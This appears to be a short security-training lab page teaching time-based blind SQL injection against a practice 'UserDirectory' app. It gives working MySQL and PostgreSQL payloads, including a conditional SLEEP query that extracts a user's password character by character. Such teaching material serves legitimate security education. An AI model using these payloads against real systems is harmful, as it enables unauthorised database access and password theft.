Mission Control
Time-based Blind SQL Injection

Welcome to UserDirectory. Test for SQL injection vulnerabilities.

Objective

Use time delays to extract data

When boolean-based blind SQLi doesn't work, use time delays. Inject: ' AND SLEEP(5)-- (MySQL) or ' AND pg_sleep(5)-- (PostgreSQL). If the page delays 5 seconds, you have SQLi.

Extract data using conditional delays: ' AND IF(SUBSTRING(password,1,1)='a',SLEEP(5),0)--. If it delays, the first character is 'a'.

Step-by-step:
  1. Test: ?id=1' AND SLEEP(5)-- (page delays 5 seconds)
  2. Extract: ?id=1' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(3),0)--
  3. Iterate through characters, noting delays
Why it works: Time delays reveal information when no other output is available.
